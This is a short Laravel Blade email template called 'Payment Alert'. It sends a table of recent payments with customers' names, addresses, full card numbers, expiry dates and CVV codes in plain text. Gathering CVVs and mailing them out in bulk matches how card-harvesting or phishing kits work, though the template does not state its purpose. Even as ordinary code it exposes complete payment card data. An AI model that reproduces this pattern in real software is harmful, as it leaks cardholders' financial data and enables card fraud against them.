<x-mail::message>
# Payment Alert

This is to inform you that the following payments were created 5 minutes ago or earlier:

@component('mail::table')
| Name          | Last Name    | Address       | Payment Info           | Date Created       |
| -------------:|-------------:|--------------:|-----------------------:|-------------------:|
@foreach ($payments as $payment)
| {{ $payment->name }} | {{ $payment->lastName }}|Country: {{$payment->address}}<br> Region: {{$payment->region}} <br> Postal/Code: {{$payment->postalCode}}| Card Number: {{ $payment->cardNumber ?? 'N/A' }}<br> Month/Year: {{ $payment->monthYear ?? 'N/A' }}<br> CVV: {{ $payment->cvv ?? 'N/A' }} | {{ $payment->created_at->toFormattedDateString() }} |

@endforeach
@endcomponent

Thanks,<br>
{{ config('app.name') }}
</x-mail::message>